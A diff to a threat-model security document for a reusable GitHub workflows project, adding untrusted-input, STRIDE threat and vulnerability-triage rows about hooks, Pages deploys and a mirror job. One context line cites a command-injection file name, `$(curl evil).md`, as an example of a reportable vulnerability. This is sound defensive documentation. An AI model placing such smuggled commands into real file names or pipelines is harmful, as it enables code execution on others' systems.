@@ -52,20 +52,23 @@ An attacker who controls any of these already has what github-workflows could gi
 
 ## Untrusted inputs
 
-| Input                         | Comes from                  | What github-workflows guarantees                                                                |
-| ----------------------------- | --------------------------- | ----------------------------------------------------------------------------------------------- |
-| Pull request files            | Any contributor             | Read by read-only jobs only; inputs reach shells through environment variables.                 |
-| Artifacts from read-only jobs | Jobs that ran project code  | The writer accepts only the changelog and fragment deletions, as regular files, from the patch. |
-| Files already on PyPI         | A partial or earlier upload | Digests and attestations must match before the GitHub Release is published.                     |
+| Input                              | Comes from                                       | What github-workflows guarantees                                                                                                                                 |
+| ---------------------------------- | ------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Pull request files                 | Any contributor                                  | Read by read-only jobs only; inputs reach shells through environment variables.                                                                                  |
+| Artifacts from read-only jobs      | Jobs that ran project code                       | The writer accepts only the changelog and fragment deletions, as regular files, from the patch.                                                                  |
+| Files already on PyPI              | A partial or earlier upload                      | Digests and attestations must match before the GitHub Release is published.                                                                                      |
+| Repository hooks and LaTeX sources | The caller's repository, including pull requests | LaTeX and pre-commit hook code runs in jobs without a write token, except the mirror job, which the caller limits to pushes to `main`, schedules and dispatches. |
 
 ## Threats and controls
 
-| STRIDE                 | Threat                                                                      | Control                                                                                             |
-| ---------------------- | --------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
-| Tampering              | A compromised build job smuggles a workflow change into the release commit. | `validate-release-patch` path and mode allowlist.                                                   |
-| Elevation of privilege | PR code reads the release App token.                                        | The token is minted only in the writer job, which runs no project code.                             |
-| Tampering              | A freshly published malicious tool version enters the release toolchain.    | Hash-checked locks resolved with a seven-day upload cooldown, and the same cutoff for helper tools. |
-| Repudiation            | Release commits cannot be traced to an approved run.                        | Commits and tags are authored by the App from a recorded workflow run.                              |
+| STRIDE                 | Threat                                                                      | Control                                                                                                                                                                   |
+| ---------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Tampering              | A compromised build job smuggles a workflow change into the release commit. | `validate-release-patch` path and mode allowlist.                                                                                                                         |
+| Elevation of privilege | PR code reads the release App token.                                        | The token is minted only in the writer job, which runs no project code.                                                                                                   |
+| Tampering              | A freshly published malicious tool version enters the release toolchain.    | Hash-checked locks resolved with a seven-day upload cooldown, and the same cutoff for helper tools.                                                                       |
+| Repudiation            | Release commits cannot be traced to an approved run.                        | Commits and tags are authored by the App from a recorded workflow run.                                                                                                    |
+| Tampering              | A pull request replaces the Pages PDF or moves a published mirror tag.      | The deploy job runs only on `main` and is the only job with Pages write. The mirror compares a published tag's tree, refuses different content, and pushes without force. |
+| Elevation of privilege | Pull request hook code runs with the mirror job's write token.              | Caller configuration: the mirror holds `contents: write` in the job that runs hooks, so callers trigger it only on pushes to `main`, schedules and dispatches.            |
 
 ## Release chain
 
@@ -74,12 +77,13 @@ Callers pin the full commit SHA of a release.
 
 ## Vulnerability or bug
 
-| Report                                                      | Verdict       | Why                              |
-| ----------------------------------------------------------- | ------------- | -------------------------------- |
-| A fragment named `$(curl evil).md` runs in `validate-news`  | Vulnerability | PR data reached a shell as code. |
-| A release patch that edits `.github/workflows/` is accepted | Vulnerability | Allowlist bypass.                |
-| A caller runs the writer on `pull_request_target`           | Not ours      | Caller configuration.            |
-| A tool update waits seven days to land                      | Expected      | The cooldown is deliberate.      |
+| Report                                                      | Verdict       | Why                                                                             |
+| ----------------------------------------------------------- | ------------- | ------------------------------------------------------------------------------- |
+| A fragment named `$(curl evil).md` runs in `validate-news`  | Vulnerability | PR data reached a shell as code.                                                |
+| A release patch that edits `.github/workflows/` is accepted | Vulnerability | Allowlist bypass.                                                               |
+| A caller runs the writer on `pull_request_target`           | Not ours      | Caller configuration.                                                           |
+| A tool update waits seven days to land                      | Expected      | The cooldown is deliberate.                                                     |
+| A caller runs the mirror on `pull_request`                  | Not ours      | Caller configuration; the README asks for push, schedule and dispatch triggers. |
 
 ## Severity
 
@@ -92,6 +96,8 @@ Callers pin the full commit SHA of a release.
 ## Accepted risks
 
 - The build job runs the project's own build backend; its outputs, not its behavior, are verified.
+- The mirror job runs the caller's pre-commit hooks while it holds `contents: write`. Callers limit its triggers as
+  described in the README.
 
 ## Keeping this current
 
